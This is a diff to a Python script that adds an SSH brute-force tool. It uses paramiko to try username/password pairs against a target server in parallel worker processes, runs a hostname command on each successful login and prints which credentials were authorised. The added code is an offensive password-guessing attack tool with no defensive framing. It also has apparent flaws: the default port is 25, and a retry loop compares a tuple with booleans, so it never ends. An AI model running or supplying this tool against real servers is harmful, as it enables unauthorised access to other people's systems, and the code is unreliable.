@@ -1,8 +1,10 @@
 #! /usr/bin/env python3
 
+import paramiko
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
+from multiprocessing import Lock, Pool, cpu_count
 from time import strftime, localtime, sleep, time
 
 status_color = {
@@ -23,6 +25,62 @@ def get_arguments(*args):
     return parser.parse_args()[0]
 
 port = 25
+lock = Lock()
+
+def login(ssh_server, port, user, password):
+    t1 = time()
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(ssh_server, port=port, username=user, password=password, allow_agent=False)
+        try:
+            stdin, stdout, stderr = ssh.exec_command("echo $HOSTNAME")
+            hostname = stdout.readlines()[0].replace('\n', '')
+        except:
+            hostname = ''
+        ssh.close()
+        t2 = time()
+        return True, hostname, t2-t1
+    except paramiko.ssh_exception.AuthenticationException:
+        t2 = time()
+        return False, '', t2-t1
+    except Exception as err:
+        t2 = time()
+        return err, '', t2-t1
+def brute_force(thread_index, ssh_server, port, credentials):
+    successful_logins = {}
+    for credential in credentials:
+        status = ''
+        while status != True and status != False:
+            status = login(ssh_server, port, credential[0], credential[1])
+            if status[0] == True:
+                successful_logins[credential[0]] = credential[1]
+                with lock:
+                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
+            elif status[0] == False:
+                with lock:
+                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+            else:
+                with lock:
+                    display(' ', f"Thread {thread_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+    return successful_logins
+def main(server, port, credentials):
+    successful_logins = {}
+    thread_count = cpu_count()
+    pool = Pool(thread_count)
+    display('+', f"Starting {Back.MAGENTA}{thread_count} Brute Force Threads{Back.RESET}")
+    display(':', f"Credentials / Threads = {Back.MAGENTA}{len(credentials)//thread_count}{Back.RESET}")
+    threads = []
+    credentials_count = len(credentials)
+    credential_groups = [credentials[group*credentials_count//thread_count: (group+1)*credentials_count//thread_count] for group in range(thread_count)]
+    for index, credential_group in enumerate(credential_groups):
+        threads.append(pool.apply_async(brute_force, (index, server, port, credential_group)))
+    for thread in threads:
+        successful_logins.update(thread.get())
+    pool.close()
+    pool.join()
+    display('+', f"Threads Finished Excuting")
+    return successful_logins
 
 if __name__ == "__main__":
     arguments = get_arguments(('-s', "--server", "server", "Target SSH Server"),
